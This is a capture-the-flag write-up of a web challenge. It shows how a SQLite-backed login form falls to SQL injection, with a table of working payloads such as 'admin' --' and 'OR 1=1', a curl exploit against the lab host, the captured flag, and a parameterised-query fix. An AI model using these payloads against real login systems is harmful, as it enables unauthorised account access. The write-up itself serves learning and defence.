# Know Your Limits

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-know-your-limits`
- **Target:** `http://54.72.82.22:8060`
- **Status:** ✅ SOLVED

## Flag

```
safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (SQLite backend)
```

Themed page: **"POLE POSITION"** motorsport — "Coffee at sunrise. Engines at noon.
The weekend is gathering speed." A `Paddock access` login form (username +
password) POSTs to `/`.

## The name is a decoy

"Know Your Limits" reads like a rate-limiting challenge, and the page obliges by
offering no throttling whatsoever — 30 rapid failed logins return `200` every
time, and spoofing `X-Forwarded-For` changes nothing:

```
attempt 1..30  -> all [200] "Login failed!"
```

**Limits** is the SQL keyword hint: `SELECT ... LIMIT`.

## The bug: SQL injection in the login query

The username is concatenated into the query. A quote plus a line comment drops the
password condition entirely:

| username | password | result |
|---|---|---|
| `admin` | `wrong` | `Login failed!` |
| `admin' --` | `x` | **`Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}`** |
| `admin'/*` | `x` | same flag |
| `' OR 1=1--` | `x` | `Welcome back user test, Flag at admin user` |
| `admin' AND 1=2--` | `x` | `Login failed!` |
| `' UNION SELECT 1--` | `x` | `That request could not be completed.` |
| `admin" --` | `x` | `Login failed!` (MySQL/Postgres quoting, not used here) |

The `OR 1=1` variant authenticates as the **first** row (user `test`) rather than
the admin, and the app helpfully labels the target: *"Flag at admin user"*.

## Exploitation

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x"
```

```
Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

`admin' --` is the minimal payload: it closes the string, comments out the rest of
the query including the `AND password = '...'` clause, and the row for `admin`
matches — so the app treats it as a successful admin login and prints the flag.

### Why the variants behave as they do

- `admin' --` matches exactly the admin row → admin session → flag.
- `' OR 1=1--` matches *every* row; the app takes the first (`test`) → wrong user,
  hence the "Flag at admin user" pointer rather than the flag itself.
- `admin' AND 1=2--` makes the WHERE clause unsatisfiable → login fails, confirming
  the injection point is real and not just a string-concatenation quirk.
- The `UNION SELECT 1--` 500-class response shows the column count is wrong
  (`That request could not be completed.`).

## Exploit

See `solve.py`.

## Fix

Parameterised queries. The username must be bound, never concatenated — and the
password should be verified against a hash, not compared in SQL at all.
